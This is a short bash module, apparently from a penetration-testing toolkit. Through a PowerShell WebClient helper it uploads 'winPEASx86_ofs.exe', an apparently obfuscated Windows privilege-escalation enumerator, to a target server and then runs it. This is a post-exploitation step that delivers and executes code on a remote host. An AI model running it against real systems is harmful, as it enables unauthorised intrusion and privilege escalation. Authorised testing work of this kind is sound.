#!/bin/bash

: '
ps: upload winPEASx86_ofs.exe file to server
'

LOCATION="${SCRIPTS_DIR}/fileTransfer/windows/.binaries"
FILE="winPEASx86_ofs.exe"

ps_webclient_upload_file "${LOCATION}" "${FILE}"
sleep 3

execute_command "${FILE_LOCATION}"
create_new_line
